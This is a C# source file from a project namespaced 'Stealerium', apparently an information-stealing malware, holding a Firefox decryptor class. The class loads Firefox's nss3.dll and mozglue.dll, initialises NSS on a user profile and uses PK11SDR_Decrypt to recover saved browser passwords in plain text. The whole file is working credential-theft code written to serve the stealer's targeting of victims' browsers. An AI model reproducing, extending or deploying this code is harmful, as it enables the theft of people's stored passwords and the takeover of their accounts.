using System;
using System.Runtime.InteropServices;
using System.Text;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox;

internal class Decryptor
{
	private static IntPtr _hNss3;

	private static IntPtr _hMozGlue;

	private static Nss3.NssInit _fpNssInit;

	private static Nss3.Pk11SdrDecrypt _fpPk11SdrDecrypt;

	private static Nss3.NssShutdown _fpNssShutdown;

	public static bool LoadNss(string sPath)
	{
		try
		{
			_hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
			_hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");
			IntPtr procAddress = WinApi.GetProcAddress(_hNss3, "NSS_Init");
			IntPtr procAddress2 = WinApi.GetProcAddress(_hNss3, "PK11SDR_Decrypt");
			IntPtr procAddress3 = WinApi.GetProcAddress(_hNss3, "NSS_Shutdown");
			_fpNssInit = (Nss3.NssInit)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(Nss3.NssInit));
			_fpPk11SdrDecrypt = (Nss3.Pk11SdrDecrypt)Marshal.GetDelegateForFunctionPointer(procAddress2, typeof(Nss3.Pk11SdrDecrypt));
			_fpNssShutdown = (Nss3.NssShutdown)Marshal.GetDelegateForFunctionPointer(procAddress3, typeof(Nss3.NssShutdown));
			return true;
		}
		catch (Exception ex)
		{
			Logging.Log("Firefox decryptor >> Failed to load NSS\n" + ex);
			return false;
		}
	}

	public static void UnLoadNss()
	{
		_fpNssShutdown();
		WinApi.FreeLibrary(_hNss3);
		WinApi.FreeLibrary(_hMozGlue);
	}

	public static bool SetProfile(string sProfile)
	{
		return _fpNssInit(sProfile) == 0L;
	}

	public static string DecryptPassword(string sEncPass)
	{
		IntPtr intPtr = IntPtr.Zero;
		try
		{
			byte[] array = Convert.FromBase64String(sEncPass);
			intPtr = Marshal.AllocHGlobal(array.Length);
			Marshal.Copy(array, 0, intPtr, array.Length);
			Nss3.TsecItem tsResult = default(Nss3.TsecItem);
			Nss3.TsecItem tsecItem = default(Nss3.TsecItem);
			tsecItem.SecItemType = 0;
			tsecItem.SecItemData = intPtr;
			tsecItem.SecItemLen = array.Length;
			Nss3.TsecItem tsData = tsecItem;
			if (_fpPk11SdrDecrypt(ref tsData, ref tsResult, 0) == 0 && tsResult.SecItemLen != 0)
			{
				byte[] array2 = new byte[tsResult.SecItemLen];
				Marshal.Copy(tsResult.SecItemData, array2, 0, tsResult.SecItemLen);
				return Encoding.UTF8.GetString(array2);
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return null;
		}
		finally
		{
			if (intPtr != IntPtr.Zero)
			{
				Marshal.FreeHGlobal(intPtr);
			}
		}
		return null;
	}
}
